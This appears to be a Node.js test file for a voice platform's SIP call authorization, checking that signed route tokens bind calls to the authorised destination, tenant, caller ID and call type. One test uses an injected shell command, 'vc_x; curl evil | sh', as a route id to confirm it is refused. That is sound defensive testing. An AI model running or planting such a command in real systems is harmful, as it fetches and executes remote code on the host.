import assert from 'node:assert/strict';
import test from 'node:test';
import { authorizeSipCall } from './sip-call-authorization.js';
import { createVoiceRouteToken } from './voice-route-token.js';

const originalSecret = process.env.AUTH_SECRET;
const originalEdge = process.env.VOCIVO_VOICE_EDGE;
const originalDomain = process.env.VOCIVO_SIP_DOMAIN;
process.env.AUTH_SECRET = 'test-route-secret';
process.env.VOCIVO_VOICE_EDGE = 'sip';
process.env.VOCIVO_SIP_DOMAIN = 'sip.vocivo.app';

test.after(() => {
  if (originalSecret === undefined) delete process.env.AUTH_SECRET; else process.env.AUTH_SECRET = originalSecret;
  if (originalEdge === undefined) delete process.env.VOCIVO_VOICE_EDGE; else process.env.VOCIVO_VOICE_EDGE = originalEdge;
  if (originalDomain === undefined) delete process.env.VOCIVO_SIP_DOMAIN; else process.env.VOCIVO_SIP_DOMAIN = originalDomain;
});

const routeId = 'vc_m2x8k1n4_7ab3cd91';
const outbound = (over: Partial<Parameters<typeof createVoiceRouteToken>[0]> = {}) => createVoiceRouteToken({
  routeId, organizationId: 'acme', destination: '+2348000000000', callerId: '+18447161777', flow: 'outbound', ...over,
});
const internal = (over: Partial<Parameters<typeof createVoiceRouteToken>[0]> = {}) => createVoiceRouteToken({
  routeId, organizationId: 'acme', destination: 'sip:employee_credential@sip.vocivo.app', flow: 'internal', ...over,
});

test('authorises the PSTN call the API signed, and answers with its caller ID', () => {
  const call = authorizeSipCall({ routeToken: outbound(), requestUser: '+2348000000000', organizationId: 'acme' });
  assert.deepEqual(call, { routeId, callerId: '+18447161777', flow: 'outbound', organizationId: 'acme' });
});

test('accepts the destination with or without the leading plus', () => {
  assert.ok(authorizeSipCall({ routeToken: outbound(), requestUser: '2348000000000' }));
});

test('refuses a call to a number other than the one the API authorised', () => {
  // The whole point: a token for a cheap destination must not pay for a call
  // to an expensive one.
  assert.equal(authorizeSipCall({ routeToken: outbound(), requestUser: '+881600000000' }), null);
});

test('refuses a token that belongs to another tenant than the credential', () => {
  assert.equal(authorizeSipCall({ routeToken: outbound({ organizationId: 'other' }), requestUser: '+2348000000000', organizationId: 'acme' }), null);
});

test('refuses an unsigned, tampered or expired token', () => {
  const token = outbound();
  assert.equal(authorizeSipCall({ routeToken: '', requestUser: '+2348000000000' }), null);
  assert.equal(authorizeSipCall({ routeToken: `${token.slice(0, -1)}x`, requestUser: '+2348000000000' }), null);
  assert.equal(authorizeSipCall({ routeToken: createVoiceRouteToken({ routeId, organizationId: 'acme', destination: '+2348000000000', callerId: '+18447161777', flow: 'outbound' }, -1), requestUser: '+2348000000000' }), null);
});

test('refuses a PSTN call the API gave no caller ID for', () => {
  assert.equal(authorizeSipCall({ routeToken: outbound({ callerId: undefined }), requestUser: '+2348000000000' }), null);
  assert.equal(authorizeSipCall({ routeToken: outbound({ callerId: 'not a number' }), requestUser: '+2348000000000' }), null);
});

test('refuses a route id the media host could not quote safely', () => {
  // The route id is a shell argument on the media host. Anything but the shape
  // /api/voice/route issues is refused here rather than escaped later.
  assert.equal(authorizeSipCall({ routeToken: outbound({ routeId: 'vc_x; curl evil | sh' }), requestUser: '+2348000000000' }), null);
  assert.equal(authorizeSipCall({ routeToken: outbound({ routeId: 'short' }), requestUser: '+2348000000000' }), null);
});

test('authorises an internal call to the extension the API named, and nothing else', () => {
  const call = authorizeSipCall({ routeToken: internal(), requestUser: 'employee_credential' });
  assert.deepEqual(call, { routeId, callerId: '', flow: 'internal', organizationId: 'acme' });
  assert.equal(authorizeSipCall({ routeToken: internal(), requestUser: 'someone_elses_credential' }), null);
});

test('will not let an internal token place a PSTN call, or the other way round', () => {
  assert.equal(authorizeSipCall({ routeToken: internal(), requestUser: '+2348000000000' }), null);
  assert.equal(authorizeSipCall({ routeToken: outbound(), requestUser: 'employee_credential' }), null);
});

test('an internal call carries no caller ID onto the trunk', () => {
  const call = authorizeSipCall({ routeToken: internal({ callerId: '+18447161777' }), requestUser: 'employee_credential' });
  assert.equal(call?.callerId, '');
});
